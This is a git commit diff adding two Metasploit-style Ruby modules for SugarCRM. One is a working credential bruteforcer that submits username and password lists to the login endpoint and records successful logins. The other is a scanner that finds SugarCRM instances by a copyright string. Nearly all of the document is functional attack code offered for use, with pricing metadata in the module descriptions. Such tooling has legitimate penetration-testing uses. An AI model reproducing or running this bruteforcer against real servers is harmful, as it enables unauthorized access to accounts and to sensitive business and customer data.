9dfe76440df70fe4563573e7761d1f4f5b77a6ab
Brandon Perry <bperry.volatile@gmail.com>
2017-04-24 08:39:23 -0500

    sugarcrm scanner and bruteforce modules

---
+++ modules/auxiliary/bruteforce/sugarcrm_bruteforce.rb
@@ -0,0 +1,155 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/http'
+
+module Metasploit
+  module Framework
+    module LoginScanner
+      class SugarCRM < ::Metasploit::Framework::LoginScanner::HTTP
+        def attempt_login(credential)
+          result_opts = {
+            credential: credential,
+            host: host,
+            port: port,
+            protocol: 'tcp',
+            #service_name: 'http'
+          }
+
+          begin
+            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
+            configure_http_client(cli)
+            cli.connect
+
+            req = cli.request_cgi({
+              'method' => 'POST',
+              'uri' => uri+'/index.php',
+              'vars_post' => {
+                'module' => 'Users',
+                'action' => 'Authenticate',
+                'return_module' => 'Users',
+                'return_action' => 'Login',
+                'user_name' => credential.public,
+                'user_password' => credential.private
+              }
+            })
+
+            res = cli.send_recv(req)
+
+            cookie = res.get_cookies
+
+            req = cli.request_cgi({
+              'uri' => uri+ '/index.php?module=Home&action=index',
+              'cookie' => cookie
+            })
+
+            res = cli.send_recv(req)
+
+            if res and res.code == 200
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+            else
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+            end
+          rescue Exception => e
+            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
+          end
+
+          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
+        end
+      end
+    end
+  end
+end
+
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::Scanner
+
+  def initialize
+    super(
+        'Name'           => 'SugarCRM Credential Bruteforce',
+        'Description'    => %q(
+        This module attempts to bruteforce weak credentials.
+
+        SugarCRM is a popular open-source CRM used by hobbyists, non-profits, and businesses alike.
+        This module attempts to bruteforce any weak credentials in the SugarCRM web application. Access
+        to SugarCRM may yield critical and sensitive business or customer information. Tested against 6.5.25.
+
+        Categories: Open Source, Enterprise
+
+        Price: 2
+
+        Video: https://asciinema.org/a/2eiw3g090zzb6w8mtrod16fuq
+
+        OS: Multi
+
+        Archo: Multi
+
+        Requirements: Metasploit Framework
+      ),
+        'Author'         =>
+          [
+          ],
+        'License'        => 'VolatileMinds',
+        'References'     =>
+          [
+          ],
+        'DefaultOptions' => {
+            'RPORT'           => 80,
+            'STOP_ON_SUCCESS' => true
+        }
+    )
+  end
+
+  def run_host(ip)
+    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS']
+    )
+
+    scanner = Metasploit::Framework::LoginScanner::SugarCRM.new(
+      configure_http_login_scanner(
+        host: ip,
+        port: datastore['RPORT'],
+        uri: datastore['TARGETURI'],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5,
+        http_username: datastore['HttpUsername'],
+        http_password: datastore['HttpPassword'],
+      )
+    )
+
+    scanner.scan! do |result|
+      creds = result.to_h
+      creds.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
+
+      if result.success?
+        credcore = create_credential(creds)
+        creds[:core] = credcore
+        create_credential_login(creds)
+        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
+      else
+        invalidate_login(creds)
+        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
+      end
+    end
+  end
+end
---
+++ modules/auxiliary/scanner/sugarcrm_scanner.rb
@@ -0,0 +1,63 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+
+  # Exploit mixins should be called first
+  include Msf::Exploit::Remote::HttpClient
+  # Scanner mixin should be near last
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize
+    super(
+      'Name'        => 'SugarCRM Scanner',
+      'Description' => %q{
+This module scans for SugarCRM instances.
+
+SugarCRM is a popular open-source enterprise-grade CRM. This modules attempts to find SugarCRM instances
+on the network. Tested against 6.5.25.
+
+Categories: Open Source, Enterprise
+
+Price: 0
+
+Video: https://asciinema.org/a/2eiw3g090zzb6w8mtrod16fuq
+
+OS: Multi
+
+Arch: Multi
+
+Requirements: Metasploit Framework
+      },
+      'Author'       => [],
+      'License'     => 'VolatileMinds'
+    )
+
+    register_options(
+      [
+        OptString.new('PATH', [ true,  "The URI to test for SugarCRM after.", '/']),
+      ], self.class)
+
+  end
+
+  def run_host(target_host)
+    res = send_request_cgi({
+      'uri' => normalize_uri(datastore['PATH'], 'index.php?action=Login&module=Users')
+    })
+
+    if res and res.body =~ /SugarCRM, Inc. Copyright \(C\)/
+      print_good("#{peer} - Found SugarCRM")
+      report_service({
+        host: target_host,
+        port: datastore['RPORT'],
+        name: 'SugarCRM',
+        info: 'SugarCRM instance'
+      })
+    end
+  end
+end
